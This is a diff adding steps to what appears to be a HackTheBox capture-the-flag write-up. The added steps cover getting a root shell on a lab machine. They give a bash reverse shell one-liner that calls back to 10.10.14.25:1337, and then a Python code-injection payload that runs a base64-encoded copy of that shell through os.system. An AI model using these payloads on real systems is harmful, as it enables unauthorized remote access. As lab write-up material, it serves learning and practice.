@@ -91,6 +91,24 @@ d8ad3edaacebd00c00e4b7c6fbdfbb77
 ```
 
 
-8. To get the root flag, we need to do 
+8. To get the root flag, we need to do reverse shell first. I used this bash script template:
 
+```sh
+bash -i >& /dev/tcp/10.10.14.25/1337 0>&1
+```
+
+9. So our payload shall look like this:
+
+```py
+') + str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS8xMzM3IDA+JjE=|base64 -d|bash')) #
+```
+
+10. Now set a listener at port 1337 and send the payload.
+
+> RESULT - GOT SHELL
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ca6c8071-116a-4c3e-88e0-6cf31dc86e88)
+
+
+11. 
 
